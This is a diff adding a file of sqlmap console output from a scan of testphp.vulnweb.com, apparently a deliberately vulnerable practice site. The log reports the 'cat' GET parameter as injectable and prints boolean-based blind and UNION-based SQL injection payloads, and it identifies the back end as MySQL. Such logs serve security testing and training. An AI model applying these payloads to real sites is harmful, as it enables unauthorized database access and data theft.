@@ -1,0 +1,27 @@
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.8}
+|_ -| . [.]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[*] starting @ 00:00:00 /2026-05-29/
+
+[00:00:01] [INFO] testing connection to the target URL
+[00:00:02] [INFO] testing if GET parameter 'cat' is dynamic
+[00:00:03] [INFO] GET parameter 'cat' appears to be dynamic
+[00:00:05] [INFO] GET parameter 'cat' is 'AND boolean-based blind' injectable
+sqlmap identified the following injection point(s) with a total of 84 HTTP(s) requests:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 1234=1234
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: cat=1 UNION ALL SELECT NULL,NULL,CONCAT(0x71,...)
+---
+[00:00:09] [INFO] the back-end DBMS is MySQL
+[00:00:09] [INFO] fetched data logged to text files under '/home/tsengine/.local/share/sqlmap/output/testphp.vulnweb.com'
+[*] ending @ 00:00:09 /2026-05-29/
